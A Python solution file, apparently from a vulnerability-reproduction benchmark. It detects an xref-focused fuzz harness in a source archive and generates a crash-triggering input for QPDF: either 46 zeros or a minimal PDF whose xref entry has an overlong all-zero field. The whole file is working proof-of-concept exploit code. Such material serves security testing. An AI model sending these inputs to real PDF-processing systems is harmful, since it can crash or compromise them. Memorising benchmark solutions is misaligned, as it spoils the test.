import os
import tarfile
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        has_specialized_xref_fuzzer = False
        try:
            if tarfile.is_tarfile(src_path):
                has_specialized_xref_fuzzer = self._detect_specialized_xref_fuzzer_tar(src_path)
            elif zipfile.is_zipfile(src_path):
                has_specialized_xref_fuzzer = self._detect_specialized_xref_fuzzer_zip(src_path)
        except Exception:
            has_specialized_xref_fuzzer = False

        if has_specialized_xref_fuzzer:
            return self._generate_xref_entry_poc()
        else:
            return self._generate_full_pdf_poc()

    def _detect_specialized_xref_fuzzer_tar(self, path: str) -> bool:
        try:
            with tarfile.open(path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name_lower = m.name.lower()
                    if (
                        not name_lower.endswith((".cc", ".cpp", ".cxx"))
                        and "fuzz" not in name_lower
                    ):
                        continue
                    if m.size > 256 * 1024:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    if b"LLVMFuzzerTestOneInput" not in data:
                        continue
                    if (
                        b"read_xrefEntry" in data
                        or b"read_xrefentry" in data
                        or b"xrefEntry" in data
                    ):
                        return True
        except Exception:
            return False
        return False

    def _detect_specialized_xref_fuzzer_zip(self, path: str) -> bool:
        try:
            with zipfile.ZipFile(path, "r") as zf:
                for info in zf.infolist():
                    name_lower = info.filename.lower()
                    if info.is_dir():
                        continue
                    if (
                        not name_lower.endswith((".cc", ".cpp", ".cxx"))
                        and "fuzz" not in name_lower
                    ):
                        continue
                    if info.file_size > 256 * 1024:
                        continue
                    try:
                        with zf.open(info, "r") as f:
                            data = f.read()
                    except Exception:
                        continue
                    if b"LLVMFuzzerTestOneInput" not in data:
                        continue
                    if (
                        b"read_xrefEntry" in data
                        or b"read_xrefentry" in data
                        or b"xrefEntry" in data
                    ):
                        return True
        except Exception:
            return False
        return False

    def _generate_xref_entry_poc(self) -> bytes:
        # Overlong f1 field consisting only of zeros, followed by space and newline.
        return b"0" * 46 + b" \n"

    def _generate_full_pdf_poc(self) -> bytes:
        # Construct a minimal PDF that forces QPDF to parse an xref table entry
        # whose first field (f1) is overlong and consists only of zeros.
        header = b"%PDF-1.3\n"
        xref_section = b"xref\n0 1\n" + (b"0" * 46) + b" 0 n\n"
        trailer_section = b"trailer\n<<>>\n"
        xref_offset = len(header)
        startxref_section = (
            b"startxref\n" + str(xref_offset).encode("ascii") + b"\n%%EOF\n"
        )
        return header + xref_section + trailer_section + startxref_section